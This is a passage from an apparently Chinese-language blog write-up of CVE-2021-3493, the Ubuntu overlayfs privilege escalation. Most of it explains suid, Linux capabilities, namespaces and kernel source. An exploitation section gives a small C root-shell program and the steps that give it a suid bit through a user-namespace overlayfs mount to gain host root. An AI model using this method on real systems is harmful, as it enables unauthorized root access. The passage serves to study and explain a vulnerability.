src="/2022/08/31/CVE-2021-3493/3.png" alt="3"></p><p>可以发现我们在 <code>merge</code> 目录中修改 <code>upper</code> 目录中出现的文件，对应也修改了 <code>upper</code> 目录的主体文件。</p><p>我们尝试在 <code>merge</code> 目录中修改只在 <code>lower</code> 目录出现的文件再观察一下变化。</p><p><img src="/2022/08/31/CVE-2021-3493/4.png" alt="4"></p><p>我们发现，<code>lower</code> 目录中对应的 <code>1.txt</code> 并没有发生改变，反而是 <code>upper</code> 目录多了一个 <code>1.txt</code> 文件，并且内容与我们填写的一致。</p><p>那么这个 <code>1.txt</code> 就可以理解为docker中的镜像，<code>2.txt</code> 就是我容器中不同于镜像的文件。</p><h3 id="capability"><a href="#capability" class="headerlink" title="capability"></a>capability</h3><p>首先介绍几个概念：<code>uid</code>，<code>ruid</code>，<code>euid</code>，<code>suid</code>。</p><h4 id="uid-ruid"><a href="#uid-ruid" class="headerlink" title="uid(ruid)"></a>uid(ruid)</h4><p>标识用户身份， 比如常见的 <code>root </code>就是0，我们安装完操作系统获得的第一个账号就是1000，当登录完成之后，这个用户的ruid就是确定的了。</p><h4 id="euid"><a href="#euid" class="headerlink" title="euid"></a>euid</h4><p>euid是用户的有效id，用于系统决定对系统资源的访问权限，通常情况下，<code>euid=ruid</code>。我们都知道：只有进程的创建者和root用户才有权利对该进程进行操作（<code>kill</code>，或者挂起，又或者是 <code>fork</code>）。于是，记录一个进程的创建者(也就是属主)就显得非常必要，进程的 <code>uid</code> 通常就是进程创建者的 <code>uid</code>，若创建者为另一个进程（<code>fork</code>），那么这个进程的 <code>uid</code> 会被继承，除非子进程被设置了 <code>suid</code>。</p><h4 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h4><p>用于对外权限的开放。跟<code>ruid</code>及<code>euid</code>是用一个用户绑定不同，它是跟文件而不是跟用户绑定，在运行这个文件时，用户会暂时获得属主的身份。</p><h4 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h4><p>进程运行之后，会获得和运行者一样的权限，它们同样受到了自身的权限访问控制。事实上这样的管理是比较安全的，我如果想自己无法直接访问这个文件，那么我通过创建进程访问文件同样会没有权限。但是如果这样管理则不能满足一些需要，比如密码文件 <code>/etc/shadow</code>，这个文件的权限是 <code>r--------</code>，属主和数组均为 <code>root</code>，那就意味着，除了 <code>root</code> 用户没有人可以查看或者修改这个文件，但是里面同时也存了我自己的密码，如果我不管怎样都获得不了 <code>root</code> 权限，那意味着我自己都修改不了我自己的密码，那这显然不太合理。于是乎就出现了 <code>suid</code>（<code>Set User ID execution</code>），我们都知道在 <code>linux</code> 当中，我们想修改自己的密码是使用 <code>passwd</code> 命令，那我们查看 <code>passwd</code> 的权限发现它被设置了 <code>suid</code> 选项。它允许我在执行这个程序的时候短暂地获得 <code>root</code> 权限，这个进程拥有 <code>root</code> 权限之后，我们就能修改 <code>/etc/shadow</code> 文件，修改完成之后，进程直接退出。</p><p>这么一看确实挺方便了，但是会带来很大的安全问题：假设， <code>passwd</code> 文件在编写的时候，存在漏洞，若在执行 <code>passwd</code> 的过程中，能通过漏洞创建一个 <code>shell</code> 进程，那么这个 <code>shell</code> 进程也会是 <code>root</code> 权限，简而言之，**<code>SUID</code> 机制增大了系统的安全攻击面。**</p><p>为了对 root 权限进行更细粒度的控制，实现按需授权，Linux 引入了另一种机制叫 <code>capability</code>。</p><h4 id="capability是什么"><a href="#capability是什么" class="headerlink" title="capability是什么"></a>capability是什么</h4><p><code>Capabilities</code> 机制是在 Linux 内核 <code>2.2</code> 之后引入的一个权限管理机制，原理就是把超级用户 <code>root(uid=0)</code> 的特权划分为不同的功能组，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p><p>这样一来，我权限检查就变成了：如果非 <code>root</code> 用户，那么检查进程是否有对应的操作权限，决定是否可以进行该操作。同样，这个权限可以在执行的时候赋予：根据进程创建者或者 <code>setuid</code> 获得，也可以从父进程继承。假如我给 <code>nginx</code> 可执行文件赋予了 <code>CAP_NET_BIND_SERVICE capabilities</code> ，那么它就能以普通用户的身份运行并监听一个1024以内的端口。</p><h4 id="进程的capability"><a href="#进程的capability" class="headerlink" title="进程的capability"></a>进程的capability</h4><p>每一个进程，具有 5 个 capabilities 集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。这 5 个 capabilities 集合分别是：</p><ul><li>Permitted</li><li>Effective</li><li>Inheritable</li><li>Bounding</li><li>Ambient</li></ul><p>这5个集合的具体含义如下：</p><h5 id="Permitted"><a href="#Permitted" class="headerlink" title="Permitted"></a>Permitted</h5><p>在进程执行时，该可执行文件的 <strong>Permitted 集合</strong>中的 <strong>capabilites</strong> 自动被加入到进程的 <strong>Permitted 集合</strong>中。进程可以通过系统调用 <code>capset()</code> 来从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 capability，前提是添加或删除的 capability 必须包含在 <code>Permitted</code> 集合中。</p><h5 id="Effective"><a href="#Effective" class="headerlink" title="Effective"></a>Effective</h5><p>内核检查线程是否可以进行特权操作时，检查的对象便是 <code>Effective</code> 集合。如之前所说，<code>Permitted</code> 集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。</p><p>比如我可能一个程序可能中间需要用户来操作，但是呢，我不希望它有过高的权限，那么我在交给用户操作的时候，我把一些权限较高的<code>capability</code> 禁用了，如果用户通过漏洞获取持久权限那将也不能够获取较高的权限。</p><h5 id="Inheritable"><a href="#Inheritable" class="headerlink" title="Inheritable"></a>Inheritable</h5><p>当执行<code>exec()</code> 系统调用时，能够被新的可执行文件继承的 capabilities，被包含在 <code>Inheritable</code> 集合中。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到子进程的 <code>Effective</code> 集合或 <code>Inheritable</code>，它只会影响新线程的 <code>Permitted</code> 集合。</p><h5 id="Bounding"><a href="#Bounding" class="headerlink" title="Bounding"></a>Bounding</h5><p><code>Bounding</code> 集合，它定义了能被继承的权限的上限，是 <code>Inheritable</code> 集合的超集，如果某个 capability 不在 <code>Bounding</code> 集合中，即使它在 <code>Permitted</code> 集合中，该线程也不能将该 capability 添加到它的 <code>Inheritable</code> 集合中。</p><p><code>Bounding</code> 集合的 <code>capabilities</code> 在执行 <code>fork()</code> 系统调用时会传递给子进程的 Bounding 集合，并且在执行 <code>execve</code> 系统调用后保持不变。</p><ul><li>当线程运行时，不能向 <code>Bounding</code> 集合中添加 <code>capabilities</code>。</li><li>一旦某个 <code>capability</code> 被从 <code>Bounding</code> 集合中删除，便不能再添加回来。</li><li>将某个 <code>capability</code> 从 <code>Bounding</code> 集合中删除后，如果之前 <code>Inherited</code> 集合包含该 <code>capability</code>，将继续保留。但如果后续从 <code>Inheritable</code> 集合中删除了该 <code>capability</code>，便不能再添加回来。</li></ul><h5 id="Ambient"><a href="#Ambient" class="headerlink" title="Ambient"></a>Ambient</h5><p>Linux <code>4.3</code> 内核新增了一个 capabilities 集合叫 <code>Ambient</code> ，用来弥补 <code>Inheritable</code> 的不足。<code>Ambient</code> 具有如下特性：</p><ul><li><code>Permitted</code> 和 <code>Inheritable</code> 未设置的 <code>capabilities</code>，<code>Ambient</code> 也不能设置。</li><li>当 <code>Permitted</code> 和 <code>Inheritable</code> 关闭某权限后，<code>Ambient</code> 也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。</li><li>非特权用户如果在 <code>Permitted</code> 集合中有一个 <code>capability</code>，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 <code>capability</code>。</li></ul><h4 id="文件的capability"><a href="#文件的capability" class="headerlink" title="文件的capability"></a>文件的capability</h4><p>文件的 <code>capabilities</code> 被保存在文件的扩展属性中。如果想修改这些属性，需要具有 <code>CAP_SETFCAP</code> 的 <code>capability</code>。文件与进程的 <code>capabilities</code> 共同决定了通过 <code>execve()</code> 运行该文件后的线程的 <code>capabilities</code>。</p><p>文件的 <code>capabilities</code> 功能，需要文件系统的支持。如果文件系统使用了 <code>nouuid</code> 选项进行挂载，那么文件的 <code>capabilities</code> 将会被忽略。</p><p>类似于进程的 <code>capabilities</code>，文件的 <code>capabilities</code> 包含了 3 个集合：</p><ul><li>Permitted</li><li>Inheritable</li><li>Effective</li></ul><p>这3个集合的具体含义如下：</p><h5 id="Permitted-1"><a href="#Permitted-1" class="headerlink" title="Permitted"></a>Permitted</h5><p>这个集合中包含的 <code>capabilities</code>，在文件被执行时，会与进程的 <code>Bounding</code> 集合计算交集，然后添加到该进程的 <code>Permitted</code> 集合中。</p><h5 id="Inheritable-1"><a href="#Inheritable-1" class="headerlink" title="Inheritable"></a>Inheritable</h5><p>这个集合与线程的 <code>Inheritable</code> 集合的交集，会被添加到执行完 <code>execve()</code> 后的线程的 <code>Permitted</code> 集合中。</p><h5 id="Effective-1"><a href="#Effective-1" class="headerlink" title="Effective"></a>Effective</h5><p>这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 <code>execve()</code> 后，线程 <code>Permitted</code> 集合中的 <code>capabilities</code> 会自动添加到它的 <code>Effective</code> 集合中。对于一些旧的可执行文件，由于其不会调用 <code>capabilities</code> 相关函数设置自身的 <code>Effective</code> 集合，所以可以将可执行文件的 <code>Effective bit</code> 开启，从而可以将 <code>Permitted</code> 集合中的 <code>capabilities</code> 自动添加到 <code>Effective</code> 集合中。</p><h4 id="常见的capability"><a href="#常见的capability" class="headerlink" title="常见的capability"></a>常见的capability</h4><p>共40个</p><table><thead><tr><th>capability 名称</th><th>描述</th></tr></thead><tbody><tr><td>CAP_AUDIT_CONTROL</td><td>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td>CAP_AUDIT_READ</td><td>允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td>CAP_AUDIT_WRITE</td><td>将记录写入内核审计日志</td></tr><tr><td>CAP_BLOCK_SUSPEND</td><td>使用可以阻止系统挂起的特性</td></tr><tr><td>CAP_CHOWN</td><td>修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td>允许设置文件的 setuid 位</td></tr><tr><td>CAP_IPC_LOCK</td><td>允许锁定共享内存片段</td></tr><tr><td>CAP_IPC_OWNER</td><td>忽略 IPC 所有权检查</td></tr><tr><td>CAP_KILL</td><td>允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LEASE</td><td>允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_MAC_ADMIN</td><td>允许 MAC 配置或状态更改</td></tr><tr><td>CAP_MAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_MKNOD</td><td>允许使用 mknod() 系统调用</td></tr><tr><td>CAP_NET_ADMIN</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_BROADCAST</td><td>允许网络广播和多播访问</td></tr><tr><td>CAP_NET_RAW</td><td>允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td>允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td>允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETPCAP</td><td>参考 capabilities man page</td></tr><tr><td>CAP_SETUID</td><td>允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td>允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td>允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_NICE</td><td>允许提升优先级及设置其他进程的优先级</td></tr><tr><td>CAP_SYS_PACCT</td><td>允许执行进程的 BSD 式审计</td></tr><tr><td>CAP_SYS_PTRACE</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td>CAP_SYS_RESOURCE</td><td>忽略资源限制</td></tr><tr><td>CAP_SYS_TIME</td><td>允许改变系统时钟</td></tr><tr><td>CAP_SYS_TTY_CONFIG</td><td>允许配置 TTY 设备</td></tr><tr><td>CAP_SYSLOG</td><td>允许使用 syslog() 系统调用</td></tr><tr><td>CAP_WAKE_ALARM</td><td>允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><p>比如我们熟知的 <code>ping</code> 命令，它所用到的底层是使用 <code>socket</code> 实现的，而 <code>socket</code> 是 <code>root</code> 用户才有权限使用的。在 <code>Ubuntu 18.04LTS</code>  的发行版当中，我们看看它是怎么解决这个权限问题的。</p><p><img src="/2022/08/31/CVE-2021-3493/5.png" alt="5"></p><p>它设置了 <code>s</code> 权限位，意味着我运行 <code>ping</code> 的时候， <code>ping</code> 这个 <code>process</code> <code>uid</code> 为 <code>0</code>，也就是 <code>root</code> 用户。</p><p>若我取消设置它的 <code>s </code>权限位，它将不再具有 <code>ping</code> 的功能。</p><p><img src="/2022/08/31/CVE-2021-3493/6.png" alt="6"></p><p>原因就如上所示，底层的 <code>socket</code> 并不允许普通用户运行。</p><p><img src="/2022/08/31/CVE-2021-3493/7.png" alt="7"></p><p>而当我把自己权限提升之后又能够使用 <code>ping</code> 命令了，是因为 <code>root</code> 用户执行读写和某些底层操作时不检查权限。</p><p>在这里我们只需要使用 <code>setcap</code> 命令将 <code>ping</code> 加上 <code>socket</code> 权限就可以让我们运行的时候获得 <code>socket</code> 权限，正常使用 <code>ping</code> 命令，这么做的好处就是假如我的 <code>ping</code> 命令有漏洞存在，那么当别人借着 <code>ping</code> 命令来提权我的计算机时会发现它获得的 <code>shell</code> 只拥有 <code>socket</code> 这么一个特权操作，其它的操作与普通用户并没有区别，这样极大地降低了安全风险，而如果我使用 <code>s</code> 权限位，那么别人通过这个获取漏洞之后将能直接获得 <code>root</code> 权限能操作计算机的一切资源。</p><p><img src="/2022/08/31/CVE-2021-3493/8.png" alt="8"></p><p>在添加完权限之后，我们发现又可以使用 <code>ping</code> 命令了，这是因为我们通过 <code>setcap</code> 让 <code>/bin/ping</code> 重新拥有了 <code>socket</code> 权限。</p><p>在这个地方我们对 <code>capability</code> 也不再深入下去了。</p><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>引用一下 <code>wiki</code> 对 <code>namespace</code> 的定义</p><blockquote><p>Namespaces are a feature of the Linux kernel that partitions kernel resources such that one set of processes sees one set of resources while another set of processes sees a different set of resources. The feature works by having the same namespace for a set of resources and processes, but those namespaces refer to distinct resources.</p></blockquote><p>直观翻译就是</p><blockquote><p>namespace 是 Linux 内核的一项特性，它可以对内核资源进行分区，使得一组进程可以看到一组资源；而另一组进程可以看到另一组不同的资源。该功能的原理是为一组资源和进程使用相同的 namespace，但是这些 namespace 实际上引用的是不同的资源。</p></blockquote><p>简单来说 <code>namespace</code> 是由 <code>Linux</code> 内核提供的，用于进程间资源隔离的一种技术。将全局的系统资源包装在一个抽象里，让进程（看起来）拥有独立的全局资源实例。同时 <code>Linux</code> 也默认提供了多种 <code>namespace</code>，用于对多种不同资源进行隔离。</p><p><code>Linux</code> 从 <code>2.4</code> 版本加入了 <code>namespace</code> 机制到 <code>3.8</code> 版本实现了 <code>User namespace</code>。</p><p><code>Cgroup namespace</code> 是进程的 <code>cgroups</code> 的虚拟化视图，通过 <code>/proc/[pid]/cgroup</code> 和 <code>/proc/[pid]/mountinfo</code> 展示。</p><table><thead><tr><th>namespace名称</th><th>系统调用参数</th><th>控制内容</th><th>内核版本</th></tr></thead><tbody><tr><td>UTS</td><td>CLONE_NEWUTS</td><td>主机名和域名</td><td>2.6.19</td></tr><tr><td>IPC</td><td>CLONE_NEWIPC</td><td>信号量，消息队列，共享内存</td><td>2.6.19</td></tr><tr><td>PID</td><td>CLONE_NEWPID</td><td>Process IDs进程号</td><td>2.6.24</td></tr><tr><td>Network</td><td>CLONE_NEWNET</td><td>网络设备，协议栈，端口等等</td><td>2.6.29</td></tr><tr><td>Cgroup</td><td>CLONE_NEWCGROUP</td><td>Cgroup root directory cgroup 根目录</td><td>2.6.29</td></tr><tr><td>Mount</td><td>CLONE_NEWNS</td><td>Mount points挂载点</td><td>2.4.19</td></tr><tr><td>User</td><td>CLONE_NEWUSER</td><td>用户和组 ID</td><td>3.8</td></tr></tbody></table><p>有了namespace之后，PID,IPC,Network等系统资源不再是全局性的，而是属于特定的Namespace。每个Namespace里面的资源对其他Namespace都是透明的。<strong>要创建新的Namespace，只需要在调用clone时指定相应的flag。</strong></p><p>以上为自己搜集的资料整理，以下为自己个人解读。</p><p>电脑开机的时候，系统会创建7个 <code>init</code> 的 <code>namespace</code>，一个进程只能切必须属于七个特定不同的 <code>namespace</code>，那么这个就是我们默认的 <code>namespace</code>。使用 <code>ls -l /proc/$$/ns</code> 可以查看本进程的 <code>namespace</code> 在这里 <code>$$</code> 变量表示自己的进程号。</p><p>在这之前我一直有一个疑问，就是为什么我普通用户 <code>-map-root-user</code> 会导致我没有 <code>root</code> 的操作权限而 <code>root</code> 用户创建的 <code>namespace</code> 即使是普通用户也有操作权限。比如如下两个例子。</p><p><code>unshare</code> 命令用于取消子进程的共享 <code>namespace</code>，通过<code>--user --map-root-user</code> 选项可以新建一个 <code>user  namespace</code> 并使新建进程的用户为 <code>root</code> 用户。</p><p><img src="/2022/08/31/CVE-2021-3493/9.png" alt="9"></p><p>此时出现了 <code>root</code> 用户无法操作 <code>/etc/shadow</code> 的场面，但是我们无论是 <code>id</code> 还是 <code>whoami</code> 看上去都跟真的 <code>root</code> 一样，确没有操作权限，确实也是比较奇怪的。但是，又合情合理，因为我普通用户我不通过 <code>su</code> 或者是 <code>sudo</code> 命令去正常提权那都是利用漏洞。</p><p>然后再来看另一个例子</p><p><img src="/2022/08/31/CVE-2021-3493/10.png" alt="10"></p><p>虽然看起来我是普通用户，但是实际上我有 <code>root</code>的权限。</p><p>因此我在这里一直不理解 <code>namespace</code> 的组织形式，直到我看到一篇博客上面画着树状图，我才猛然顿悟。</p><p><code>namespace</code> 是树状图的一种形式，然后文件系统中在标记属主的时候会标记一个 <code>namespace</code> 字段，标识由哪一个 <code>namespace</code> 的用户创建的，然后再检查权限的时候若当前用户不属于当前 <code>namespace</code> 那么就会向上寻找，直到找到对应的 <code>namespace</code>，然后检查是谁创建的。然后对应的权限就是那个 <code>namespace</code> 的创建者的。如果是这样的话，那么就能解释通了，我之前疑惑的点不在于为什么我没有操作权限而是它怎么判断的我没有操作权限，因为没有操作权限属于正常现象，如果我的想法不对也请师傅们指正，这只是一个我认为比较合理能解释得通的解释。</p><h2 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h2><p>我们先创建好 <code>overlayfs</code> 的那几个文件夹，准备挂载，然后在其中的 <code>upper</code> 目录中写上我们的 <code>exp</code> 并编译好。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>exp</code> 非常简单，就是 <code>setuid</code> 和 <code>setgid</code> 为 <code>0</code>，也就是 <code>root</code>。</p><p>然后我们再创建一个 <code>user namepsace</code> 和 <code>mount namespace</code> 。</p><p>在 <code>./merge</code> 当中，我们为刚刚编译的 <code>exp</code> 设置 <code>setuid</code> 的权限。</p><p>然后再开一个终端，我们发现 <code>upper</code> 目录中的 <code>exp</code> 同样具有了 <code>setuid</code> 的权限，说明我们的权限逃逸成功了。</p><p><img src="/2022/08/31/CVE-2021-3493/11.png" alt="11"></p><p>我们运行 <code>exp</code> 成功获得了真实的 <code>root</code> 权限。</p><p><img src="/2022/08/31/CVE-2021-3493/12.png" alt="12"></p><h2 id="内核代码分析"><a href="#内核代码分析" class="headerlink" title="内核代码分析"></a>内核代码分析</h2><h3 id="namespace结构"><a href="#namespace结构" class="headerlink" title="namespace结构"></a>namespace结构</h3><p>首先我第一步呢，就是去求证了一下我上面的猜想是否正确，在 <a href="https://github.com/torvalds/linux/blob/64222515138e43da1fcf288f0289ef1020427b87/include/linux/user_namespace.h">github</a> 上找到对应的 <code>namespace</code> 的代码，这里不用管什么版本了，大体变化是不会很大的，我们先来看 <code>user_namespace</code> 结构体的定义：</p><p><img src="/2022/08/31/CVE-2021-3493/13.png" alt="13"></p><p>我们很清楚地能看到里面的一个定义：<code>user_namespace *parent</code>，这里也能说明，它是存在父子关系的，和我们之前的猜测大体是一样的，并且会标注 <code>owner</code> 和 <code>group</code>，这里应该是创建这个 <code>namespace</code> 的属主和属组。我们同时也看到还有一个 <code>level</code> 变量，这里我大概猜测一下，是 <code>namespace</code> 的深度，也就是往后迭代了多少次，这个学过算法设计应该还是好理解的，我在建立树的时候，我们一般也会标记深度方便去查找，我猜测在这里我们需要的就是进行权限检查，如果 <code>namespace</code> 双方为父子关系，那么我们直接看父亲的权限即可，然而实际情况比较复杂，首先谁是父亲谁是儿子就很难判断，所以我跟上深度能很容易知道谁是父亲谁是儿子，如果不是父子关系，那么我们可以查 <code>LCA</code> 找到最近公共祖先，看看两个 <code>namespace</code> 的创建者权限如何。</p><p>我们找到对应的 <code>user_namespace.c</code> 文件，看看创建一个 <code>namespace</code> 的时候发生了什么。这里推荐给大家读内核代码的一些思路：大部分的代码都会写一个完全不带安全检查的函数，比如我创建一个 <code>namespace</code>，那么我们一定能找到只实现创建 <code>namespace</code> 的一个函数，这个函数通常会在进行了一系列安全检查之后才允许被调用，包括我们平时做一些网站开发之类的也一样，我们会写一个定向只做某些事情的接口，但是接口不会直接被调用而是会进行一系列安全检查，诸如非法数据判断和权限问题，我们默认传进去的参数都是合法的，它常规的三部曲就是：检查，执行，善后。那么言归正传，看到代码</p><h5 id="part1"><a href="#part1" class="headerlink" title="part1"></a>part1</h5><p><img src="/2022/08/31/CVE-2021-3493/14.png" alt="14"></p><p>参数应该是一个父进程，因为它在第一行写了 <code>parent_ns=new-&gt;user_ns</code>，<code>parent_ns</code> 我们很容易知道是父 <code>namespace</code>，而这里传进去的是一个 <code>cred</code> 结构体，结构体中有一个 <code>user_ns</code> 应该是 <code>user_namespace</code>。下面两行设置了 <code>euid</code> 和 <code>egid</code>，那么很清晰了，<code>owner</code> 和 <code>group</code> 就是创建这个 <code>namespace</code> 的属主和属组。</p><p>下面有一个如果父进程的 <code>user namepsace</code> 层数超过 <code>32</code> 那么直接 <code>goto fail</code>，那就是说这里不允许这棵树创建超过32的深度。</p><p>后面执行一个 <code>inc_user_namespaces</code> 函数并判断是否执行成功，我们往下深挖一下代码，这里因为代码比较短，就贴这里了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ucounts *<span class="title">inc_ucount</span><span class="params">(struct user_namespace *ns, <span class="keyword">kuid_t</span> uid,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">enum</span> ucount_type type)</span><span class="comment">//in kernel/ucount.c</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>, *<span class="title">iter</span>, *<span class="title">bad</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">tns</span>;</span></span><br><span class="line">ucounts = alloc_ucounts(ns, uid);</span><br><span class="line"><span class="keyword">for</span> (iter = ucounts; iter; iter = tns-&gt;ucounts) &#123;</span><br><span class="line"><span class="keyword">long</span> max;</span><br><span class="line">tns = iter-&gt;ns;</span><br><span class="line">max = READ_ONCE(tns-&gt;ucount_max[type]);</span><br><span class="line"><span class="keyword">if</span> (!atomic_long_inc_below(&amp;iter-&gt;ucount[type], max))</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ucounts;</span><br><span class="line">fail:</span><br><span class="line">bad = iter;</span><br><span class="line"><span class="keyword">for</span> (iter = ucounts; iter != bad; iter = iter-&gt;ns-&gt;ucounts)</span><br><span class="line">atomic_long_dec(&amp;iter-&gt;ucount[type]);</span><br><span class="line"></span><br><span class="line">put_ucounts(ucounts);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> struct ucounts *<span class="title">inc_user_namespaces</span><span class="params">(struct user_namespace *ns, <span class="keyword">kuid_t</span> uid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> inc_ucount(ns, uid, UCOUNT_USER_NAMESPACES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难看出来，这里应该只是分配一个 <code>ucounts</code> 结构体的内存，我猜测 <code>ucounts</code> 应该是 <code>namespace</code> 的衍生类，因为我们看到 <code>inc_user_namespace</code> 增加 <code>user namespace</code> 实际就是调用增加 <code>ucounts</code> 的一个方法，并且估计其它的 <code>namespace</code> 也需要通过这个调用来分配内存，并且我们观察枚举类也能发现有我们所有 <code>namespace</code> 的一个定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">ucount_type</span> &#123;</span></span><br><span class="line">UCOUNT_USER_NAMESPACES,</span><br><span class="line">UCOUNT_PID_NAMESPACES,</span><br><span class="line">UCOUNT_UTS_NAMESPACES,</span><br><span class="line">UCOUNT_IPC_NAMESPACES,</span><br><span class="line">UCOUNT_NET_NAMESPACES,</span><br><span class="line">UCOUNT_MNT_NAMESPACES,</span><br><span class="line">UCOUNT_CGROUP_NAMESPACES,</span><br><span class="line">UCOUNT_TIME_NAMESPACES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_INOTIFY_USER</span></span><br><span class="line">UCOUNT_INOTIFY_INSTANCES,</span><br><span class="line">UCOUNT_INOTIFY_WATCHES,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FANOTIFY</span></span><br><span class="line">UCOUNT_FANOTIFY_GROUPS,</span><br><span class="line">UCOUNT_FANOTIFY_MARKS,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">UCOUNT_RLIMIT_NPROC,</span><br><span class="line">UCOUNT_RLIMIT_MSGQUEUE,</span><br><span class="line">UCOUNT_RLIMIT_SIGPENDING,</span><br><span class="line">UCOUNT_RLIMIT_MEMLOCK,</span><br><span class="line">UCOUNT_COUNTS,</span><br><span class="line">&#125;;<span class="comment">//in user_namespace.h</span></span><br></pre></td></tr></table></figure><p>但是去看了 <code>ucounts</code> 结构体的定义发现里面就定义了一个 <code>user_namespace</code> 的指针和一个链表，队列，以及标识了一个 <code>uid</code>。这个 <code>ucounts</code> 可能只是一个用于做某些标记的东西，我们暂且不管把先。</p><p>后面有一个 <code>current_chrooted</code> 函数，我们同样看看它的定义：</p><figure class="highlight c"><table><tr><td 